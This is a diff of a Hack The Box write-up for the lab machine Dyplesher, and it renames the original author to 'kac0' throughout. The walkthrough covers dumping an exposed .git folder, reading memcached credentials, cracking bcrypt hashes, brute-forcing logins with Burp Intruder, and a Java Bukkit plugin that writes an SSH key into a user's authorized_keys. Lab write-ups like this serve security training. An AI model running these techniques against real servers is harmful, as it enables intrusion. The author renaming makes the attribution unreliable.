@@ -9,6 +9,7 @@ avatar: assets/htb/dyplesher.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Dyplesher
 ---
+
 ## Overview
 
 Dyplesher was an insane difficulty Linux machine that tested both web enumeration skills, and code review and writing skills. Multiple Git repositories containing source code, the Memcache service, and a Minecraft server were all exploited to gain access to this machine.  I learned quite a bit about the inner workings of a Minecraft server and how their plugins work during the course of this challenge!
@@ -63,7 +64,7 @@ Initial credit to [https://gist.github.com/maxivak/513191447d15c4d30953006d99928
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ nmap -n -v -sCV -p- <YOUR_IP> -oA dyplesher
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 20:41 EDT
 snipped...
@@ -244,23 +245,23 @@ There were also two unknown ports: 25562 and 25572.  I was quite curious about t
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-dyplesher-minecraft.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-dyplesher-minecraft.png)
 
 On port 80 there was a Minecraft server hosted called the "Worst Minecraft Server".  There was not much information on the page itself, other than a virtual host notated at `test.dyplesher.htb`, which I added to my hosts file and navigated to.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-test-page.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-test-page.png)
 
 At `test.dyplesher.htb` there was a page where I could enter a key/value pair which would be inserted into the local memcache, and the page would tell me whether the key and value were equal to each other. After playing around with adding different pairs I decided to move on.   
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-staff.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-staff.png)
 
 I found a link to the website staff, which led to a page with 3 potential users.  There was a link under each username which pointed to `http://dyplesher.htb:8080/`.  I added `dyplesher.htb` to my hosts file and tried to navigate to the first one `http://dyplesher.htb:8080/arrexel` but port 8080 was not open. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-appjs.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-appjs.png)
 
 In the source code of the page I found an `app.js`; at the bottom of the code found a path `C:\Users\felamos\Documents\tekkro\resources\js\app.js` which looks like a Windows path _\(I thought this was a linux machine?\)_  _I figured that this pointed towards this machine requiring cross-compilation of code later on._  The path also referenced the username `felamos` which I had seen earlier. It looks like this may be the site's developer.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-tekkit-minecraft.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-tekkit-minecraft.png)
 
 Searching for `tekkro` led to [https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic](https://tekkitserverlist.com/server/0fOnRygu/tekkro-tekkit-classic), which refers to a mod pack for Minecraft called `Tekkit Classic` which seems to possibly be quite outdated since it was last updated in May of 2018. 
 
@@ -274,12 +275,12 @@ This potentially reveals the version of this Minecraft server as 1.2.5.
 
 ### The .git repository
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-git-dirbuster.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-git-dirbuster.png)
 
 While scanning with dirbuster, I found a `.git` folder.  Browsing to this folder resulted in getting denied, so next I tried using `git-dumper.py` like I did in the Hack the Box machine [`Travel`](../hard/travel-write-up.md).
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ ~/.local/bin/git-dumper/git-dumper.py http://test.dyplesher.htb/.git/ gitdump                   1 ⨯
 [-] Testing http://test.dyplesher.htb/.git/HEAD [200]
 [-] Testing http://test.dyplesher.htb/.git/ [403]
@@ -330,22 +331,22 @@ While scanning with dirbuster, I found a `.git` folder.  Browsing to this folder
 [-] Fetching http://test.dyplesher.htb/.git/objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433 [200]
 [-] Running git checkout .
 
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ cd gitdump        
 
-┌──(zweilos㉿kali)-[~/htb/dyplesher/gitdump]
+┌──(kac0㉿kali)-[~/htb/dyplesher/gitdump]
 └─$ ls -la         
 total 16
-drwxr-xr-x 3 zweilos zweilos 4096 Oct 10 16:08 .
-drwxr-xr-x 5 zweilos zweilos 4096 Oct 10 16:08 ..
-drwxr-xr-x 7 zweilos zweilos 4096 Oct 10 16:08 .git
--rw-r--r-- 1 zweilos zweilos  513 Oct 10 16:08 index.php
--rw-r--r-- 1 zweilos zweilos    0 Oct 10 16:08 README.md
+drwxr-xr-x 3 kac0 kac0 4096 Oct 10 16:08 .
+drwxr-xr-x 5 kac0 kac0 4096 Oct 10 16:08 ..
+drwxr-xr-x 7 kac0 kac0 4096 Oct 10 16:08 .git
+-rw-r--r-- 1 kac0 kac0  513 Oct 10 16:08 index.php
+-rw-r--r-- 1 kac0 kac0    0 Oct 10 16:08 README.md
 ```
 
 Using `git-dumper.py` I was able to dump the contents of the git repository, and started searching through the source code.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-git-index.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-git-index.png)
 
 In the file `index.php` there were credentials for `felamos:zxcvbnm` and access information for a memcached server.   I did some research to see if there was a way to access this remotely and found [https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line](https://techleader.pro/a/90-Accessing-Memcached-from-the-command-line), which describes how to access memcache through the command line.
 
@@ -354,7 +355,7 @@ _This is source code for the page I saw hosted at `test.dyplesher.htb`, and it d
 ### Enumerating memcached
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ telnet <YOUR_IP> 11211
 Trying <YOUR_IP>...
 Connected to <YOUR_IP>.
@@ -403,7 +404,7 @@ The `memclient` tool also failed to work properly because I was unable to figure
 I tried one last tool from GitHub called `bmemcached-cli` from [https://github.com/RedisLabs/bmemcached-cli](https://github.com/RedisLabs/bmemcached-cli) since it supported remote login.  Unfortunately this `bmemcached-cli` tool was written in python2 so I had to go through and fix it up so it ran in python3...but after fixing it up it ran just fine and connected me to the memcached server using the credentials I found.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher/bmemcached-cli]
+┌──(kac0㉿kali)-[~/htb/dyplesher/bmemcached-cli]
 └─$ bmemcached-cli felamos:zxcvbnm@dyplesher.htb:11211                        
 Connecting to felamos:zxcvbnm@dyplesher.htb:11211
 ([B]memcached) help
@@ -427,7 +428,7 @@ I did some research on enumerating memcached and found two useful sites:
 Using this information I began enumerating the memcached service.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher/bmemcached-cli]
+┌──(kac0㉿kali)-[~/htb/dyplesher/bmemcached-cli]
 └─$ bmemcached-cli felamos:zxcvbnm@dyplesher.htb:11211
 Connecting to felamos:zxcvbnm@dyplesher.htb:11211
 ([B]memcached) stats
@@ -588,7 +589,7 @@ It seems like there are a lot of items stored in this service \(2588\).
                          'total_malloced': b'4194304'}}
 ([B]memcached) stats cachedump 1 1000
 Traceback (most recent call last):
-  File "/home/zweilos/.local/lib/python3.8/site-packages/bmemcachedcli/main.py", line 79, in handler
+  File "/home/kac0/.local/lib/python3.8/site-packages/bmemcachedcli/main.py", line 79, in handler
     pprint.pprint(getattr(self.memcache, name)(*parts))
 TypeError: stats() takes from 1 to 2 positional arguments but 4 were given
 ```
@@ -613,7 +614,7 @@ None
 I got some results back when trying to get values for the keys 'username' and 'password'.  I was able to collect three usernames and three password hashes.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ hashcat --help | grep -i bcrypt                                                           
 3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
 ```
@@ -621,7 +622,7 @@ I got some results back when trying to get values for the keys 'username' and 'p
 I identified the hashes as bcrypt by the `$2a$` before the salt and used hashcat's help to get the right hashtype code. Next I fired up hashcat to attempt to crack the hashes using `rockyou.txt`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ hashcat -O -D1,2 -a0 -m3200 hashes /usr/share/wordlists/rockyou.txt                              
 hashcat (v6.1.1) starting...
 
@@ -667,42 +668,42 @@ One of the password hashes was cracked fairly quickly, however only two of the h
 
 I tried logging into SSH and the login page on the `dyplesher.htb` site with this password and the four usernames I found but I had no luck there.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-gogs.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-gogs.png)
 
 Looking back at the nmap report, I saw that port 3000 was running another HTTP service hosting `Gogs`.  Searching for Gogs and git led to [https://gogs.io/](https://gogs.io/), which gave me some information about this self-hosted git service.  I navigated to the local Gogs repo page to check it out.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-register.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-register.png)
 
 I created an account to see what would happen, but then changed my mind and went back and tried to see if I already had credentials for an active account.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-felamos-gogs.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-felamos-gogs.png)
 
 I used burp intruder to brute force the login page with the usernames and passwords I had collected.  The username `felamos` and the password `mommy1` logged me in to a dashboard where I could see that `felamos` had created two git repositories.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-test.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-test.png)
 
 I noted the email addresses on the `/explore/users` page _\(and my test account!\)_.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-felamos-profile.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-felamos-profile.png)
 
 There was nothing of use in any of the profile pages.  I got hopeful when I saw the SSH keys page, but there wasn't anything there.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-felamos-index.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-felamos-index.png)
 
 I found a git repository with the code for the memcached page were I got the credentials for `felamos`. This looks to be the repository I retrieved earlier with `gitdump.py`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-gitlab-backup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-gitlab-backup.png)
 
 l also found backup of a gitlab page, but there was only a basic `README.md` file. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-gitlab-releases.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-gitlab-releases.png)
 
 The `/releases` page for the gitlab repo held a few downloads.  The Source code links just contained a `README.md` with no useful information, however the `repo.zip` was more interesting.
 
 ### Recreating a git repository from a .bundle file
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ tree repositories    
 repositories
 └── @hashed
@@ -725,99 +726,99 @@ I downloaded and extracted `repo.zip` and found that it contained a `repositorie
 I did some research on gitlab .bundle files and found [https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7](https://gist.github.com/paulgregg/181779ad186221aaa35d5a96c8abdea7) which contained instructions on how to recreate a git repository from these files.
 
 ```text
-┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4b/22]
+┌──(kac0㉿kali)-[~/…/repositories/@hashed/4b/22]
 └─$ git clone --mirror 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle ./repo/.git
 Cloning into bare repository './repo/.git'...
 Receiving objects: 100% (39/39), 10.46 KiB | 10.46 MiB/s, done.
 Resolving deltas: 100% (12/12), done.
 
-┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4b/22]
+┌──(kac0㉿kali)-[~/…/repositories/@hashed/4b/22]
 └─$ cd repo 
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ git init
-Reinitialized existing Git repository in /home/zweilos/htb/dyplesher/repositories/@hashed/4b/22/repo/.git/
+Reinitialized existing Git repository in /home/kac0/htb/dyplesher/repositories/@hashed/4b/22/repo/.git/
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ git checkout
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ git status  
 On branch master
 nothing to commit, working tree clean
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4b/22/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4b/22/repo]
 └─$ ls
 LICENSE  README.md  src
 ```
 
 I followed the instructions and was able to successfully recreate the git repository for the first .bundle file.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-vote-listener.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-vote-listener.png)
 
 The first .bundle file turned into a repo for `votelistener.py` which seemed to be a plugin for taking in-game user votes.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-vote-listenerpy.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-vote-listenerpy.png)
 
 There did not seem to be anything that was actually useful other than a potential database to check out.
 
 ```text
-┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4e/07]
+┌──(kac0㉿kali)-[~/…/repositories/@hashed/4e/07]
 └─$ git clone --mirror 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle repo/.git
 Cloning into bare repository 'repo/.git'...
 Receiving objects: 100% (51/51), 20.94 MiB | 98.79 MiB/s, done.
 Resolving deltas: 100% (5/5), done.
 
-┌──(zweilos㉿kali)-[~/…/repositories/@hashed/4e/07]
+┌──(kac0㉿kali)-[~/…/repositories/@hashed/4e/07]
 └─$ cd repo
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4e/07/repo]
 └─$ git init
-Reinitialized existing Git repository in /home/zweilos/htb/dyplesher/repositories/@hashed/4e/07/repo/.git/
+Reinitialized existing Git repository in /home/kac0/htb/dyplesher/repositories/@hashed/4e/07/repo/.git/
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4e/07/repo]
 └─$ git checkout
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4e/07/repo]
 └─$ git status                           
 On branch master
 nothing to commit, working tree clean
 
-┌──(zweilos㉿kali)-[~/…/@hashed/4e/07/repo]                                                                                               ┌──(zweilos㉿kalimaa)-[~/…/@hashed/4e/07/repo]
+┌──(kac0㉿kali)-[~/…/@hashed/4e/07/repo]                                                                                               ┌──(kac0㉿kalimaa)-[~/…/@hashed/4e/07/repo]
 └─$ ls -la    
 total 38376
-drwxr-xr-x 7 zweilos zweilos     4096 Oct 10 20:21 .
-drwx------ 4 zweilos zweilos     4096 Oct 10 20:19 ..
--rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 banned-ips.json
--rw-r--r-- 1 zweilos zweilos        3 Oct 10 20:21 banned-players.json
--rw-r--r-- 1 zweilos zweilos     1304 Oct 10 20:21 bukkit.yml
--rw-r--r-- 1 zweilos zweilos      623 Oct 10 20:21 commands.yml
--rw-r--r-- 1 zweilos zweilos 19427415 Oct 10 20:21 craftbukkit-1.8.jar
--rw-r--r-- 1 zweilos zweilos      180 Oct 10 20:21 eula.txt
-drwxr-xr-x 7 zweilos zweilos     4096 Oct 10 20:21 .git
--rw-r--r-- 1 zweilos zweilos       77 Oct 10 20:21 .gitignore
--rw-r--r-- 1 zweilos zweilos     2576 Oct 10 20:21 help.yml
--rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 ops.json
--rw-r--r-- 1 zweilos zweilos        0 Oct 10 20:21 permissions.yml
-drwxr-xr-x 4 zweilos zweilos     4096 Oct 10 20:21 plugins
-drwxr-xr-x 2 zweilos zweilos     4096 Oct 10 20:21 python
--rw-r--r-- 1 zweilos zweilos      798 Oct 10 20:21 README.md
--rw-r--r-- 1 zweilos zweilos   147843 Oct 10 20:21 sc-mqtt.jar
--rw-r--r-- 1 zweilos zweilos      770 Oct 10 20:21 server.properties
--rw-r--r-- 1 zweilos zweilos 19629658 Oct 10 20:21 spigot-1.8.jar
--rw-r--r-- 1 zweilos zweilos      413 Oct 10 20:21 start.command
--rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 usercache.json
--rw-r--r-- 1 zweilos zweilos        2 Oct 10 20:21 whitelist.json
-drwxr-xr-x 5 zweilos zweilos     4096 Oct 10 20:21 world
-drwxr-xr-x 3 zweilos zweilos     4096 Oct 10 20:21 world_the_end
+drwxr-xr-x 7 kac0 kac0     4096 Oct 10 20:21 .
+drwx------ 4 kac0 kac0     4096 Oct 10 20:19 ..
+-rw-r--r-- 1 kac0 kac0        2 Oct 10 20:21 banned-ips.json
+-rw-r--r-- 1 kac0 kac0        3 Oct 10 20:21 banned-players.json
+-rw-r--r-- 1 kac0 kac0     1304 Oct 10 20:21 bukkit.yml
+-rw-r--r-- 1 kac0 kac0      623 Oct 10 20:21 commands.yml
+-rw-r--r-- 1 kac0 kac0 19427415 Oct 10 20:21 craftbukkit-1.8.jar
+-rw-r--r-- 1 kac0 kac0      180 Oct 10 20:21 eula.txt
+drwxr-xr-x 7 kac0 kac0     4096 Oct 10 20:21 .git
+-rw-r--r-- 1 kac0 kac0       77 Oct 10 20:21 .gitignore
+-rw-r--r-- 1 kac0 kac0     2576 Oct 10 20:21 help.yml
+-rw-r--r-- 1 kac0 kac0        2 Oct 10 20:21 ops.json
+-rw-r--r-- 1 kac0 kac0        0 Oct 10 20:21 permissions.yml
+drwxr-xr-x 4 kac0 kac0     4096 Oct 10 20:21 plugins
+drwxr-xr-x 2 kac0 kac0     4096 Oct 10 20:21 python
+-rw-r--r-- 1 kac0 kac0      798 Oct 10 20:21 README.md
+-rw-r--r-- 1 kac0 kac0   147843 Oct 10 20:21 sc-mqtt.jar
+-rw-r--r-- 1 kac0 kac0      770 Oct 10 20:21 server.properties
+-rw-r--r-- 1 kac0 kac0 19629658 Oct 10 20:21 spigot-1.8.jar
+-rw-r--r-- 1 kac0 kac0      413 Oct 10 20:21 start.command
+-rw-r--r-- 1 kac0 kac0        2 Oct 10 20:21 usercache.json
+-rw-r--r-- 1 kac0 kac0        2 Oct 10 20:21 whitelist.json
+drwxr-xr-x 5 kac0 kac0     4096 Oct 10 20:21 world
+drwxr-xr-x 3 kac0 kac0     4096 Oct 10 20:21 world_the_end
 ```
 
 The next repository contained many more files, and looked to be the main code for this Minecraft server.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-gitlab-code-4e.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-gitlab-code-4e.png)
 
 ```text
-┌──(zweilos㉿kalimaa)-[~/htb/dyplesher]
+┌──(kac0㉿kalimaa)-[~/htb/dyplesher]
 └─$ tree repositories    
 repositories
 └── @hashed
@@ -902,45 +903,45 @@ This repository contained a lot of files.  I started with checking out `craftbuk
 >
 > Get Bukkit strives to be available 24 hours a day and 7 days a week for server owners, hosts, and the general public, providing the safest and most trusted third-party Minecraft server mirror.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-bukkit-conf%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-bukkit-conf%2520%25281%2529%2520%25281%2529.png)
 
 I found some potential database login information in `bukkit.yml` but couldn't figure out how to connect to it.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-minecraft-settings.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-minecraft-settings.png)
 
 The file `server.properties` had a flag in the motd field but nothing else useful was to be found.
 
 ```text
-┌──(zweilos㉿kali)-[~/…/4e/07/repo/plugins]
+┌──(kac0㉿kali)-[~/…/4e/07/repo/plugins]
 └─$ ls
 LoginSecurity  LoginSecurity.jar  PluginMetrics
 
-┌──(zweilos㉿kali)-[~/…/4e/07/repo/plugins]
+┌──(kac0㉿kali)-[~/…/4e/07/repo/plugins]
 └─$ cd LoginSecurity 
 
-┌──(zweilos㉿kali)-[~/…/07/repo/plugins/LoginSecurity]
+┌──(kac0㉿kali)-[~/…/07/repo/plugins/LoginSecurity]
 └─$ ls
 authList  config.yml  users.db
 ```
 
 In the plugins folder there was a `LoginSecurity.jar` and related files, including a `users.db` which looked interesting. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-loginsecurity-configyml.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-loginsecurity-configyml.png)
 
 The file `config.yml` had more database credentials, this time for a MySQL database.
 
 ### The users database
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-loginsecurity-usersdb.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-loginsecurity-usersdb.png)
 
 I opened up `users.db` in the DB browser for SQLite an started looking through it.  There was not a lot of information stored in this database.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-loginsecurity-usersdb-password.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-loginsecurity-usersdb-password.png)
 
 The `users` table contained only one record, but it held another bcrypt password hash.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher]
+┌──(kac0㉿kali)-[~/htb/dyplesher]
 └─$ hashcat -O -D1,2 -a0 -m3200 hashes /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 
@@ -970,33 +971,33 @@ $2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6:alexis1
 
 I decrypted the hash with hashcat and found another password: `alexis1`.  Once more I tried SSH login and failed, so again I tried using burp's Intruder on the main site's \([http://dyplesher.htb](http://dyplesher.htb)\) login page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-sitelogin2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-sitelogin2.png)
 
 First, I captured a login request to the site, and configured Intruder to only brute force the name portion of the email field.  I went under the assumption that the email address would end in `@dyplesher.htb` since that was what I found on the internal Gogs site.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-sitelogin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-sitelogin.png)
 
 I set the payload to only contain the list of names I had found on the site.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-sitelogin-intruder.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-sitelogin-intruder.png)
 
 After running Intruder, I got a redirect to the `/home` page after logging in using `felamos@dyplesher.htb`and `alexis1`. 
 
 ### The Minecraft server site
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-logged-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-logged-in.png)
 
 After logging in I was greeted by a fancy dashboard with all sorts of statistics that made it look like this was a pretty successful game server \(contrary to the headline of 'Worst Minecraft server'\).
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-console.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-console.png)
 
 The console tab showed a running activity log for the game server.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-users.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-users.png)
 
 On the players tab I found a page with a potential list of more usernames. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-plugin-add.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-plugin-add.png)
 
 There was also a plugin upload page, which looked very interesting since it seemed I had permissions to upload files. Next I did some research on creating malicious Minecraft plugins to see if I could get code execution on the server through uploading my own plugin.
 
@@ -1037,33 +1038,33 @@ I did a lot of research on writing Minecraft plugins and coding in Java.  I have
 * Bukkit plugin code example from:
   * https://github.com/Bukkit/SamplePlugin
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-eclipse.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-eclipse.png)
 
 First I fired up the Eclipse IDE and loaded the Bukkit sample plugin.  Next I added a package to the project.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-add-jars.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-add-jars.png)
 
 While adding the new package I added the different .jar files I had found in the source code as libraries to the project since they seemed to all be dependencies for this plugin.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-plugin.yml.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-plugin.yml.png)
 
 One of the required files I had to create was called plugin.yml, and contained some basic configuration information about the plugin.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-pom.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-pom.png)
 
 Another required file for the plugin was `pom.xml`.  This one contained basic information about the plugin such as the name, version,  and the dependencies.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/dyplesher] 
+┌──(kac0㉿kali)-[~/htb/dyplesher] 
 └─$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair. 
-Enter file in which to save the key (/home/zweilos/.ssh/id_ecdsa): dyplesher.key 
+Enter file in which to save the key (/home/kac0/.ssh/id_ecdsa): dyplesher.key 
 Enter passphrase (empty for no passphrase): 
 Enter same passphrase again: 
 Your identification has been saved in dyplesher.key Your public key has been saved in dyplesher.key.pub
 
-┌──(zweilos㉿kali)-[~/htb/dyplesher] 
+┌──(kac0㉿kali)-[~/htb/dyplesher] 
 └─$ cat dyplesher.key.pub
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= kac0@kali
 ```
 
 I created a new SSH key to use to try to log in to each user on the machine.
@@ -1072,7 +1073,7 @@ I created a new SSH key to use to try to log in to each user on the machine.
 /**
  * key-writer plugin for dyplesher
 
- * @author zweilos
+ * @author kac0
  */
 import org.bukkit.plugin.java.JavaPlugin;
 
@@ -1085,7 +1086,7 @@ public class Plugin extends JavaPlugin {
 
         try {
             Writer minatoWrite = new BufferedWriter(new OutputStreamWriter(new FileOutputStream("/home/MinatoTW/.ssh/authorized_keys"), "utf-8"));
-            minatoWrite.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= zweilos@kali");
+            minatoWrite.write("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNcXZSv1c0okURSUinJWRCJyRJH64w1sBdoYgGDSC1IC/yoEEyTtVV7DgbjuAumrFXWifccQOywvSBG+MDWwlzw= kac0@kali");
             minatoWrite.close();
         } catch(IOException e){
             e.printStackTrace();
@@ -1101,7 +1102,7 @@ public class Plugin extends JavaPlugin {
 
 For the main Java program I wrote my plugin to write the public key I generated to the `authorized_keys` file of each user, to the default folder such as `/home/MinatoTW/.ssh`.  After uploading my plugin on the site and reloading the page I tried to log in through SSH.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-code.png)
